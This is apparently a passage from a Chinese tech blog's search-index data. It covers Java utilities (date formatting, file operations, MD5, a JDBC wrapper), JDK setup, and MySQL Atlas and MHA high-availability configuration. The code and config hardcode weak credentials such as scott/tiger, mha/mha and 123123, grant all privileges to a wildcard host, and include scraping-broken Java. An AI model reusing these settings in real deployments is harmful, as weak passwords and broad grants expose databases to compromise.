-MM- dd HH:mm:ss * @param intDate 长整型日期 * @return String 字符型时间 */ public static String formatIntToDateString(String _format, long intDate) { Date time = new Date(); SimpleDateFormat format; String strtime; if (intDate \u003e 0) { try { long c_unix_time2 = intDate; time.setTime(c_unix_time2 * 1000); format = new SimpleDateFormat(_format, Locale.getDefault()); strtime = format.format(time); } catch (Exception ex) { strtime = \"\"; ex.printStackTrace(); } } else { strtime = \"\"; } return strtime; } /** * 将长整型转换为日期类型 * @param intDate 长整型日期 * @return Date 日期类型时间 */ public static Date formatIntToDate(long intDate) { Date time = new Date(); if(intDate\u003e0){ time.setTime(intDate * 1000); } return time; } /** * 将字符串转换为日期类型 * @param strDate 字符型日期 * @return Date 日期类型时间 */ public static Date formatStringToDate(String strDate) { SimpleDateFormat format; if (strDate.trim().equals(\"\" )) return null ; try { format = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\" , Locale . getDefault()); return format.parse(strDate); } catch (Exception ex) { return null ; } } /** * 将字符串转换为日期类型 * @param strDate 字符型日期 * @return Date 日期类型时间 */ public static Date formatStrToDate(String strDate) { SimpleDateFormat format; if (strDate.trim().equals(\"\" )) return null ; try { format = new SimpleDateFormat(\"yyyy-MM-dd\" , Locale . getDefault()); return format.parse(strDate); } catch (Exception ex) { return null ; } } /** * 将日期转换成长整型 * @param p_date 日期型时间 * @return long 长整型时间 */ public static long formatDateToInt(Date p_date) { if (p_date != null) { return p_date.getTime() / 1000; } return 0; } /** * 将字符串日期转换成长整类型日期 * @param strDate 字符串型时间 * @return long 长整型时间 */ public static long formatDateStringToInt(String strDate) { SimpleDateFormat format; Date time; if (strDate.trim().equals(\"\" )) return -1; String strAry[] = strDate.split( \":\"); if (strAry.length \u003e 1) format = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\" , Locale . getDefault()); else format = new SimpleDateFormat(\"yyyy-MM-dd\" , Locale.getDefault()); try { time = format.pa","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%97%A5%E6%9C%9F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/:1:0","tags":["linux","java","scripts"],"title":"Java日期格式化处理组件","uri":"/posts/scripts/java/%E6%97%A5%E6%9C%9F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/"},{"categories":["那些年的收藏"],"content":"文件处理组件","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/","tags":["linux","java","scripts"],"title":"java文件处理组件","uri":"/posts/scripts/java/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/"},{"categories":["那些年的收藏"],"content":" import java.io.File; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.FileOutputStream; import java.io.FileWriter; import java.io.IOException; import java.io.InputStream; import java.io.PrintWriter; import com.ultrapower.eoms.common.RecordLog; /** * 文件处理组件 * @version Apr 21, 2010 5:50:00 PM */ public class FileOperUtil { /** * 删除目录下的所有文件 * @param path 文件夹路径 * @exception Exception */ public static void deleteFile(String path) throws Exception { File file = new File(path); if (file.isDirectory()) { File[] files = file.listFiles(); int len = files.length ; for (int i = 0; i \u003c len; i++) { deleteFile(files[i].getAbsolutePath()); } } file.delete(); } /** * 新建目录 * @param folderPath 文件夹路径 例如:c:/test */ public static void newFolder(String folderPath) { try { String filePath = folderPath; filePath = filePath.toString(); java.io.File myFilePath = new java.io.File(filePath); if (!myFilePath.exists()) { myFilePath.mkdir(); } } catch (Exception e) { RecordLog.printLog(\"新建目录,\"+folderPath+ \",出错,\"+e.getMessage(), RecordLog.LOG_LEVEL_ERROR); e.printStackTrace(); } } /** * 新建文件 * @param filePathAndName 文件路径 例如:c:/test/a.txt * @param fileContent 文件的内容 * @throws IOException */ public static void newFile(String filePathAndName, String fileContent) throws IOException { String filePath = filePathAndName; filePath = filePath.toString(); File myFilePath = new File(filePath); if (!myFilePath.exists()) { myFilePath.createNewFile(); } FileWriter resultFile = new FileWriter(myFilePath); PrintWriter myFile = new PrintWriter(resultFile); String strContent = fileContent; myFile.println(strContent); resultFile.close(); } /** * 删除文件 * * @param filePathAndName * 文件路径 例如:c:/test/a.txt */ public static void delFile(String filePathAndName) { try { String filePath = filePathAndName; filePath = filePath.toString(); java.io.File myDelFile = new java.io.File(filePath); myDelFile.delete(); } catch (Exception e) { RecordLog.printLog(\"删除文件,\"+filePathAndName+ \",出错,\"+e.getMessage(), RecordLog.LOG_LEVEL_ERROR); e.printStackTrace(); } } /** * 删除文件夹 * @param folderPath 文件夹路径 例如:c:/test * @return 如果删除成功,则返回 true;否则返回 false。 */ public static boolean delFolder(String folderPath) { boolean flag = false; try { delAllFile(folderPath); //删除完里面所有内容 String filePath = folderPath; filePath = filePath.toString(); java.io.File myFilePath = new java.io.File(filePath); flag = myFilePath.delete(); //删除空文件夹 } catch (Exception e) { RecordLog.printLog(\"删除文件夹,\"+folderPath+\",出错,\" +e.getMessage(), RecordLog .LOG_LEVEL_ERROR); e.printStackTrace(); } return flag; } /** * 删除文件夹里面的所有文件 * @param path 文件夹路径 例如:c:/test */ public static void delAllFile(String path) { File file = new File(path); if (!file.exists()) { return; } if (!file.isDirectory()) { return; } String[] tempList = file.list(); File temp = null; for (int i = 0; i \u003c tempList.length; i++) { if (path.endsWith(File.separator)) { temp = new File(path + tempList[i]); } else { temp = new File(path + File.separator + tempList[i]); } if (temp.isFile()) { temp.delete(); } if (temp.isDirectory()) { delAllFile(path + \"/\" + tempList[i]); // 先删除文件夹里面的文件 delFolder(path + \"/\" + tempList[i]); // 再删除空文件夹 } } } /** * 复制单个文件 * @param oldPath 文件夹路径 例如:c:/test/a.txt * @param newPath 文件夹路径 例如:c:/test/a.txt * @throws IOException */ public static void copyFile(String oldPath, String newPath) throws IOException { int bytesum = 0; int byteread = 0; File oldfile = new File(oldPath); if (oldfile.exists()) { // 文件存在时 InputStream inStream = new FileInputStream(oldPath); // 读入原文件 FileOutputStream fs = new FileOutputStream(newPath); byte[] buffer = new byte[1444]; while ((byteread = inStream.read(buffer)) != -1) { bytesum += byteread; // 字节数 文件大小 System. out.println(bytesum); fs.write(buffer, 0, byteread); } inStream.close(); } } /** * 复制整个文件夹内容 * @param oldPath 文件夹路径 例如:c:/test * @param newPath 文件夹路径 例如:c:/abc */ public static void copyFolder(String oldPath, String newPath) { try { ( new File(newPath)).mkdirs(); // 如果文件夹不存在 则建立新文件夹 Fi","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/:0:0","tags":["linux","java","scripts"],"title":"java文件处理组件","uri":"/posts/scripts/java/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/"},{"categories":["那些年的收藏"],"content":"Md5加密算法","date":"2022-06-24","objectID":"/posts/scripts/java/md5%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/","tags":["linux","java","scripts"],"title":"java下的Md5加密算法","uri":"/posts/scripts/java/md5%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"},{"categories":["那些年的收藏"],"content":"java 下的 MD5 算法 /************************************************ MD5 算法的Java Bean @author:Topcat Tuppin Last Modified:10,Mar,2001 *************************************************/ import java.lang.reflect.*; /************************************************* md5 类实现了RSA Data Security, Inc.在提交给IETF 的RFC1321中的MD5 message -digest 算法。 *************************************************/ public class MD5 { /* 下面这些S11-S44实际上是一个4*4的矩阵，在原始的C实现中是用#define 实现的， 这里把它们实现成为static final是表示了只读，切能在同一个进程空间内的多个 Instance间共享*/ static final int S11 = 7; static final int S12 = 12; static final int S13 = 17; static final int S14 = 22; static final int S21 = 5; static final int S22 = 9; static final int S23 = 14; static final int S24 = 20; static final int S31 = 4; static final int S32 = 11; static final int S33 = 16; static final int S34 = 23; static final int S41 = 6; static final int S42 = 10; static final int S43 = 15; static final int S44 = 21; static final byte[] PADDING = {-128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; /* 下面的三个成员是MD5计算过程中用到的3个核心数据，在原始的C实现中 被定义到MD5_CTX结构中 */ private long[] state = new long[4]; // state (ABCD) private long[] count = new long[2]; // number of bits, modulo 2^64 (lsb first) private byte[] buffer = new byte[64]; // input buffer /* digestHexStr是MD5的唯一一个公共成员，是最新一次计算结果的 16进制ASCII表示. */ public String digestHexStr; /* digest,是最新一次计算结果的2进制内部表示，表示128bit的MD5值. */ private byte[] digest = new byte[16]; /* getMD5ofStr是类MD5最主要的公共方法，入口参数是你想要进行MD5变换的字符串 返回的是变换完的结果，这个结果是从公共成员digestHexStr取得的． */ public String getMD5ofStr(String inbuf) { md5Init(); md5Update(inbuf.getBytes(), inbuf.length()); md5Final(); digestHexStr = \"\"; for (int i = 0; i \u003c 16; i++) { digestHexStr += byteHEX(digest[i]); } return digestHexStr; } // 这是MD5这个类的标准构造函数，JavaBean要求有一个public的并且没有参数的构造函数 public MD5() { md5Init(); return; } /* md5Init是一个初始化函数，初始化核心变量，装入标准的幻数 */ private void md5Init() { count[0] = 0 L; count[1] = 0 L; ///* Load magic initialization constants. state[0] = 0x67452301 L; state[1] = 0xefcdab89 L; state[2] = 0x98badcfe L; state[3] = 0x10325476 L; return; } /* F, G, H ,I 是4个基本的MD5函数，在原始的MD5的C实现中，由于它们是 简单的位运算，可能出于效率的考虑把它们实现成了宏，在java中，我们把它们 实现成了private方法，名字保持了原来C中的。 */ private long F(long x, long y, long z) { return (x \u0026 y) | ((~x) \u0026 z); } private long G(long x, long y, long z) { return (x \u0026 z) | (y \u0026 (~z)); } private long H(long x, long y, long z) { return x ^ y ^ z; } private long I(long x, long y, long z) { return y ^ (x | (~z)); } /* FF,GG,HH和II将调用F,G,H,I进行近一步变换 FF, GG, HH, and II transformations for rounds 1, 2, 3, and 4. Rotation is separate from addition to prevent recomputation. */ private long FF(long a, long b, long c, long d, long x, long s, long ac) { a += F(b, c, d) + x + ac; a = ((int) a \u003c\u003c s) | ((int) a \u003e\u003e\u003e (32 - s)); a += b; return a; } private long GG(long a, long b, long c, long d, long x, long s, long ac) { a += G(b, c, d) + x + ac; a = ((int) a \u003c\u003c s) | ((int) a \u003e\u003e\u003e (32 - s)); a += b; return a; } private long HH(long a, long b, long c, long d, long x, long s, long ac) { a += H(b, c, d) + x + ac; a = ((int) a \u003c\u003c s) | ((int) a \u003e\u003e\u003e (32 - s)); a += b; return a; } private long II(long a, long b, long c, long d, long x, long s, long ac) { a += I(b, c, d) + x + ac; a = ((int) a \u003c\u003c s) | ((int) a \u003e\u003e\u003e (32 - s)); a += b; return a; } /* md5Update是MD5的主计算过程， inbuf是要变换的字节串， inputlen是长度，这个 函数由getMD5ofStr调用，调用之前需要调用md5init，因此把它设计成private的 */ private void md5Update(byte[] inbuf, int inputLen) { int i, index, partLen; byte[] block = new byte[64]; index = (int)(count[0] \u003e\u003e\u003e 3) \u0026 0x3F; // /* Update number of bits */ if ((count[0] += (inputLen \u003c\u003c 3)) \u003c (inputLen \u003c\u003c 3)) count[1]++; count[1] += (inputLen \u003e\u003e\u003e 29); partLen = 64 - index; // Transform as many times as possible. if (inputLen \u003e= partLen) { md5Memcpy(buffer, inbuf, index, 0, partLen); md5Transform(buffer); for (i = partLen; i + 63 \u003c inputLen; i += 64","date":"2022-06-24","objectID":"/posts/scripts/java/md5%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/:1:0","tags":["linux","java","scripts"],"title":"java下的Md5加密算法","uri":"/posts/scripts/java/md5%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"},{"categories":["那些年的收藏"],"content":"Java Jdbc连接封装","date":"2022-06-24","objectID":"/posts/scripts/java/jdbc%E8%BF%9E%E6%8E%A5%E5%B0%81%E8%A3%85/","tags":["linux","java","scripts"],"title":"Jdbc连接封装","uri":"/posts/scripts/java/jdbc%E8%BF%9E%E6%8E%A5%E5%B0%81%E8%A3%85/"},{"categories":["那些年的收藏"],"content":"java 的jdbc 连接封装 import java.sql.Connection; import java.sql.DriverManager; import java.sql.PreparedStatement; import java.sql.CallableStatement; import java.sql.ResultSet; import java.sql.SQLException; import java.sql.Timestamp; import java.util.ArrayList; import java.util.Date; import java.util.List; import com.sun.corba.se.spi.orbutil.fsm.Guard.Result; public class DB { // 数据库驱动类 private final static String DRIVER_NAME = \"oracle.jdbc.driver.OracleDriver\"; // 数据库URL地址 private static final String URL = \"jdbc:oracle:thin:@localhost:1521:orcl\"; // 数据库用户名 private static final String USERNAME = \"scott\"; // 密码 private static final String PASSWORD = \"tiger\"; private Connection con = null; private PreparedStatement ps = null; private ResultSet rs = null; static { try { Class.forName(DRIVER_NAME); } catch (ClassNotFoundException e) { e.printStackTrace(); } } /** * 获得数据库连接 * * @return 数据库连接 */ public Connection getConnection() throws ClassNotFoundException, SQLException { if (con == null) { con = DriverManager.getConnection(URL, USERNAME, PASSWORD); } return con; } public ResultSet executeQuery(String sql, Object...params) throws ClassNotFoundException, SQLException { con = this.getConnection(); ps = con.prepareStatement(sql); for (int i = 0; i \u003c params.length; i++) { Object o = params[i]; if (o instanceof Date) { Date d = (Date) o; Timestamp t = new Timestamp(d.getTime()); ps.setTimestamp(i + 1, t); } else { ps.setObject(i + 1, o); } } rs = ps.executeQuery(); return rs; } /** * 执行查询操作，返回一个结果接 * * @param sql 要执行的SQL语句 * @param list SQL参数的集合 * @return 结果集 * @throws SQLException * @throws ClassNotFoundException */ public ResultSet executeQuery(String sql, List list) throws ClassNotFoundException, SQLException { con = this.getConnection(); // 获得预编译语句对象 ps = con.prepareStatement(sql); // 传递参数 if (list != null) { for (int i = 0; i \u003c list.size(); i++) { Object o = list.get(i); if (o instanceof Date) { Date d = (Date) o; Timestamp t = new Timestamp(d.getTime()); ps.setTimestamp(i + 1, t); } else { ps.setObject(i + 1, o); } } } rs = ps.executeQuery(); return rs; } public int executeUpdate(String sql, Object...params) throws ClassNotFoundException, SQLException { con = this.getConnection(); ps = con.prepareStatement(sql); for (int i = 0; i \u003c params.length; i++) { Object o = params[i]; if (o instanceof Date) { Date d = (Date) o; Timestamp t = new Timestamp(d.getTime()); ps.setTimestamp(i + 1, t); } else { ps.setObject(i + 1, o); } } return ps.executeUpdate(); } /** * 执行增删改语句，返回受影响的行数 * @param sql sql语句 * @param list sql语句的参数集合 */ public int executeUpdate(String sql, List list) throws ClassNotFoundException, SQLException { con = this.getConnection(); ps = con.prepareStatement(sql); if (list != null) { for (int i = 0; i \u003c list.size(); i++) { Object o = list.get(i); if (o instanceof Date) { Date d = (Date) o; Timestamp t = new Timestamp(d.getTime()); ps.setTimestamp(i + 1, t); } else { ps.setObject(i + 1, o); } } } return ps.executeUpdate(); } /** * 无参数的存储过程 * * @throws SQLException * @throws ClassNotFoundException */ public void prepareCall(String storename, Object... params) throws ClassNotFoundException, SQLException { con = this.getConnection(); String str = \" call \"+ storename; cs = con.prepareCall(str); for (int i = 0; i \u003c params.length; i++) { Object o = params[i]; if (o instanceof Date) { Date d = (Date) o; Timestamp t = new Timestamp(d.getTime()); cs.setTimestamp(i + 1, t); } else { cs.setObject(i + 1, o); } } cs.execute(); } /** * 调用有输出参数 (输出参数类型只能为Stirng类型的数据)的存储过程 * * @throws List\u003cInteger\u003e 指定注册类型 * @throws SQLException * @throws ClassNotFoundException */ public List\u003cString\u003e prepareCall(String storename, List\u003cInteger\u003e list, Object.. . params) throws ClassNotFoundException, SQLException { con = this.getConnection(); String str = \" call \"+ storename; cs = con.prepareCall(str); List\u003cInteger\u003e klist = new ArrayList\u003cInteger\u003e(); List\u003cString\u003e relist = new ArrayList\u003cString\u003e(); if (params.length != 0) { for (int i = 0; i \u003c params.length; i++) { Ob","date":"2022-06-24","objectID":"/posts/scripts/java/jdbc%E8%BF%9E%E6%8E%A5%E5%B0%81%E8%A3%85/:1:0","tags":["linux","java","scripts"],"title":"Jdbc连接封装","uri":"/posts/scripts/java/jdbc%E8%BF%9E%E6%8E%A5%E5%B0%81%E8%A3%85/"},{"categories":["那些年的收藏"],"content":"ODBC 连接配置 ODBC配置：开始–\u003e管理工具 –\u003e数据源–\u003e 用户DSN–\u003e添加 –\u003e选择Oracle in OraDb10g_home1–\u003e完成 Data Source Name中填JdbcOdbc Description为描述可不填 TNS Service Name中选择Oracle User ID中填你要使用的数据库中的用户 完成配置后确定 Java文件中需要配置的东西: 定义三个值 : Connection con = null; PreparedStatement pst = null; ResultSet rs = null; 下面的是需要处理异常的代码段: Class.forName( \"sun.jdbc.odbc.JdbcOdbcDriver\" ); String url = \"jdbc:odbc:JdbcOdbc\" ; con = DriverManager.getConnection(url, \"cxd\", \"cxd\" ); String sql = \"select * from code where username ='name' and userpassword ='password' \"; pst = con.prepareStatement(sql); rs = pst.executeQuery(); //执行查询操作 String sql = \"delete from name \"; pst = con.prepareStatement(sql); pst.executeUpdate(); //执行删除操作\u003c增删改都使用它\u003e //任何时候都要进行关闭 if (rs != null) { rs.close(); } if (pst != null) { pst.close(); } if (con != null) { con.close(); } } catch (SQLException e) { e.printStackTrace(); } ","date":"2022-06-24","objectID":"/posts/scripts/java/jdbc%E8%BF%9E%E6%8E%A5%E5%B0%81%E8%A3%85/:2:0","tags":["linux","java","scripts"],"title":"Jdbc连接封装","uri":"/posts/scripts/java/jdbc%E8%BF%9E%E6%8E%A5%E5%B0%81%E8%A3%85/"},{"categories":["linux","运维记事"],"content":"Jdk环境变量配置","date":"2022-06-24","objectID":"/posts/linux/jdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/","tags":["linux","java"],"title":"JDK环境变量配置","uri":"/posts/linux/jdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"windows 新建JAVA_HOME变量：JAVA_HOME=C:\\Program Files\\Java\\jdk1.8.0_191 新建CLASSPATH变量，变量值为：.;%JAVA_HOME%\\lib;%JAVA_HOME%\\lib\\tools.jar 在path变量添加变量值：%JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin ","date":"2022-06-24","objectID":"/posts/linux/jdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/:1:0","tags":["linux","java"],"title":"JDK环境变量配置","uri":"/posts/linux/jdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"linux ","date":"2022-06-24","objectID":"/posts/linux/jdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/:2:0","tags":["linux","java"],"title":"JDK环境变量配置","uri":"/posts/linux/jdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"1. 配置文件方式修改 [root@00 ~]# vi /etc/profile ## vi ~/.bash_profile export JAVA_HOME=/opt/java_1.8.0_45 export PATH=$JAVA_HOME/bin:$PATH export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar [root@00 ~]# source /etc/profile ## source ~/.bash_profile ","date":"2022-06-24","objectID":"/posts/linux/jdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/:3:0","tags":["linux","java"],"title":"JDK环境变量配置","uri":"/posts/linux/jdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"2. 通过命令update-alternatives 管理 多版本共存时切换很方便： http://www.open-open.com/lib/view/open1452089422355.html ## 第一个参数--install表示向update-alternatives注册服务名。 ## 第二个参数是注册最终地址，成功后将会把命令在这个固定的目的地址做真实命令的软链，以后管理就是管理这个软链； ## 第三个参数：服务名，以后管理时以它为关联依据。 ## 第四个参数，被管理的命令绝对路径。 ## 第五个参数，优先级，数字越大优先级越高。 [root@00 ~]# update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_121/bin/java 1070 [root@00 ~]# update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_121/bin/javac 1070 [root@00 ~]# update-alternatives --install /usr/bin/jar jar /opt/jdk1.8.0_121/bin/jar 1070 [root@00 ~]# update-alternatives --install /usr/bin/javah javah /opt/jdk1.8.0_121/bin/javah 1070 [root@00 ~]# update-alternatives --install /usr/bin/javap javap /opt/jdk1.8.0_121/bin/javap 1070 [root@00 ~]# update-alternatives --config java ","date":"2022-06-24","objectID":"/posts/linux/jdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/:4:0","tags":["linux","java"],"title":"JDK环境变量配置","uri":"/posts/linux/jdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"Mysql Atlas高可用软件","date":"2022-06-24","objectID":"/posts/mysql/atlas%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/","tags":["linux","mysql"],"title":"Mysql Atlas高可用软件","uri":"/posts/mysql/atlas%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"Atlas 主要功能 读写分离 从库负载均衡 IP 过滤 SQL 语句黑白名单 自动分表 https://github.com/Qihoo360/Atlas 接 MHA 高可用集群后，软件也可单独使用 注意事项: Atlas 只能运行在 x64 系统上 Mysql 版本应大于 5.1,建议使用 5.6 以上 ","date":"2022-06-24","objectID":"/posts/mysql/atlas%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/:1:0","tags":["linux","mysql"],"title":"Mysql Atlas高可用软件","uri":"/posts/mysql/atlas%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"安装 $\u003e yum install Atlas-2.2.1.el6.x86_64.rpm # 配置文件(可动态修改，不用重启) $\u003e cd /usr/local/mysql-proxy/conf \u0026\u0026 cp -v test.cnf instance.cnf $\u003e vim /usr/local/mysql-proxy/conf/instance.cnf [mysql-proxy] # 带#号的为非必需的配置项目 # 管理接口的用户名 admin-username = user # 管理接口的密码 admin-password = pwd # Atlas后端连接的MySQL主库的IP和端口，可设置多项，用逗号分隔 ## 提供写入服务(一般为主库)的地址，建议VIP的地址 proxy-backend-addresses = 10.0.2.9:3306 #Atlas后端连接的MySQL从库的IP和端口，@后面的数字代表权重，用来作负载均衡，若省略则默认为1，可设置多项，用逗号分隔 ## 只读(从库)库的地址 proxy-read-only-backend-addresses = 10.0.2.25:3305@1,10.0.2.27:3305@1 #用户名与其对应的加密过的MySQL密码，密码使用PREFIX/bin目录下的加密程序encrypt加密，下行的user1和user2为示例，将其替换为你的MySQL的用户名和加密密码！ # 此处配的的密码为前端DBA、程序等用户连接mysql的用户名密码，必须在此处声明一下 pwds = user1:+jKsgB3YAG8=, user2:GS+tr4TPgqc= #设置Atlas的运行方式，设为true时为守护进程方式，设为false时为前台方式，一般开发调试时设为false，线上运行时设为true,true后面不能有空格。 daemon = true #设置Atlas的运行方式，设为true时Atlas会启动两个进程，一个为monitor，一个为worker，monitor在worker意外退出后会自动将其重启，设为false时只有worker，没有monitor，一般开发调试时设为false，线上运行时设为true,true后面不能有空格。 keepalive = true #工作线程数，对Atlas的性能有很大影响，可根据情况适当设置 event-threads = 8 #日志级别，分为message、warning、critical、error、debug五个级别 log-level = message #日志存放的路径 log-path = /usr/local/mysql-proxy/log #SQL日志的开关，可设置为OFF、ON、REALTIME，OFF代表不记录SQL日志，ON代表记录SQL日志，REALTIME代表记录SQL日志且实时写入磁盘，默认为OFF ## 用于记录实时的sql操作日志，用于审计 #sql-log = OFF #慢日志输出设置。当设置了该参数时，则日志只输出执行时间超过sql-log-slow（单位：ms)的日志记录。不设置该参数则输出全部日志。 #sql-log-slow = 10 #实例名称，用于同一台机器上多个Atlas实例间的区分 #instance = test # Atlas监听的工作接口IP和端口 proxy-address = 0.0.0.0:33060 # Atlas监听的管理接口IP和端口 ## 用于管理atlas的端口 admin-address = 0.0.0.0:2345 #分表设置，此例中person为库名，mt为表名，id为分表字段，3为子表数量，可设置多项，以逗号分隔，若不分表则不需要设置该项 #tables = person.mt.id.3 #默认字符集，设置该项后客户端不再需要执行SET NAMES语句 ## 此项一定要和数据库字符集一致 #charset = utf8 #允许连接Atlas的客户端的IP，可以是精确IP，也可以是IP段，以逗号分隔，若不设置该项则允许所有IP连接，否则只允许列表中的IP连接 #client-ips = 127.0.0.1, 192.168.1 #Atlas前面挂接的LVS的物理网卡的IP(注意不是虚IP)，若有LVS且设置了client-ips则此项必须设置，否则可以不设置 #lvs-ips = 192.168.1.1 ","date":"2022-06-24","objectID":"/posts/mysql/atlas%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/:2:0","tags":["linux","mysql"],"title":"Mysql Atlas高可用软件","uri":"/posts/mysql/atlas%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"基本管理 登陆 ","date":"2022-06-24","objectID":"/posts/mysql/atlas%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/:3:0","tags":["linux","mysql"],"title":"Mysql Atlas高可用软件","uri":"/posts/mysql/atlas%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"Mysql MHA高可用软件","date":"2022-06-24","objectID":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/","tags":["linux","mysql"],"title":"Mysql MHA高可用软件","uri":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"MHA(Master HA) 高可用软件 自动主从切换工具 https://github.com/yoshinorim/mha4mysql-manager https://github.com/yoshinorim/mha4mysql-node ","date":"2022-06-24","objectID":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/:1:0","tags":["linux","mysql"],"title":"Mysql MHA高可用软件","uri":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"基础环境 环境准备(1管理, 1主2从): manager: 172.16.10.10(10.0.2.10) master01: 172.16.10.25(10.0.2.25) slave01: 172.16.10.26(10.0.2.26) slave02: 172.16.10.27(10.0.2.27) ","date":"2022-06-24","objectID":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/:2:0","tags":["linux","mysql"],"title":"Mysql MHA高可用软件","uri":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"准备 关闭所有节点relay_log自动清理功能 # 临时 sql\u003e set global relay_log_purge = 0; # 永久 $\u003e vim /etc/my.cnf relay_log_purge = 0 设置从库只读功 sql\u003e set global read_only=1 各个节点互连 $\u003e ssh-keygen $\u003e ssh-copy-id root@10.0.2.25 $\u003e ssh-copy-id root@10.0.2.26 $\u003e ssh-copy-id root@10.0.2.27 ","date":"2022-06-24","objectID":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/:3:0","tags":["linux","mysql"],"title":"Mysql MHA高可用软件","uri":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"安装 ## 所有节点安装mha node软件包 # mha node 软件包依赖 $\u003e yum install perl-DBD-MySQL -y ## mha node 软件安装 $\u003e yum install -y mha4mysql-node-0.58-0.el7.centos.noarch.rpm ## 主库添加MHA管理用户 $\u003e mysql -uroot -e \"grant all privileges on *.* to mha@'10.0.2.%' identified by 'mha';\" ## 管理机安装manager软件(管理节点安装，建议独立一台或非主节点服务器) # 依赖环境 $\u003e yum install perl-Config-Tiny epel-release perl-Log-Dispatch perl-Parallel-ForkManager perl-Time-HiRes -y # mha manager 软件安装 $\u003e yum install perl-Config-Tiny epel-release perl-Log-Dispatch perl-Parallel-ForkManager perl-Time-HiRes -y $\u003e yum install mha4mysql-manager-0.58-0.el7.centos.noarch.rpm -y # 创建配置文件目录 $\u003e mkdir /etc/mha $\u003e mkdir -p /var/log/mha/app1 $\u003e vim /etc/mha/app1.cnf [server default] # 用于管理stop slave,change master,reset slave等操作的账号，缺省为root user=mha password=mha # mha manager生成的日志据对路径，如果没有设置，mha manager将打印在标准输出，标准错误输出上 manager_log=/var/log/mha/app1/manager # mha manager生成的相关状态文件的绝对路径，如果没有设置，则默认使用/var/tmp manager_workdir=/var/log/mha/app1 # 在master上生成binlog的绝对路径 master_binlog_dir=/data/mysqldb/binlog # 这个参数表示mha manager多久ping（执行select ping sql语句）一次master，连续三个丢失ping连接，mha master就判定mater死了，因此，通过4次ping间隔的最大时间的机制来发现故障，默认是3，表示间隔是3秒 ping_interval=2 # repl_user参数指定的用户名密码 repl_user=repl repl_password=123123 # 